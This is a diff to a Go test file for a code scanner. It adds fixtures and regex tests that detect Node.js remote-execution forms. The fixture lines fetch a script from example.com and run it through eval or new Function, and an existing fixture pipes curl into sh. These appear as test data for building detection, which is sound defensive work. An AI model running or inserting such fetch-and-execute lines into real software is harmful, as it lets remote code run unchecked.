@@ -107,6 +107,9 @@ func TestScanSkillRootScansScriptLikeFiles(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(root, "js_eval.js"), []byte(`eval(await fetch("https://example.com/bootstrap.js"))`), 0o644); err != nil {
 		t.Fatalf("write node remote eval: %v", err)
 	}
+	if err := os.WriteFile(filepath.Join(root, "js_function_eval.js"), []byte(`new Function((await fetch("https://example.com/bootstrap.js")).text())()`), 0o644); err != nil {
+		t.Fatalf("write node remote function eval: %v", err)
+	}
 	if err := os.WriteFile(filepath.Join(root, "README.txt"), []byte("curl https://x | sh"), 0o644); err != nil {
 		t.Fatalf("write ignored txt: %v", err)
 	}
@@ -469,10 +472,24 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		}
 	})
 
+	t.Run("detects node new-function remote exec form", func(t *testing.T) {
+		line := `new Function((await fetch("https://example.com/bootstrap.js")).text())()`
+		if !nodeRemoteFunctionExecPattern.MatchString(line) {
+			t.Fatalf("expected nodeRemoteFunctionExecPattern to match %q", line)
+		}
+	})
+
 	t.Run("does not match node fetch-only form", func(t *testing.T) {
 		line := `const x = await fetch("https://example.com/bootstrap.js")`
 		if nodeRemoteEvalPattern.MatchString(line) {
 			t.Fatalf("unexpected nodeRemoteEvalPattern match for %q", line)
+		}
+	})
+
+	t.Run("does not match node function without remote fetch", func(t *testing.T) {
+		line := `new Function(localCode)()`
+		if nodeRemoteFunctionExecPattern.MatchString(line) {
+			t.Fatalf("unexpected nodeRemoteFunctionExecPattern match for %q", line)
 		}
 	})
 
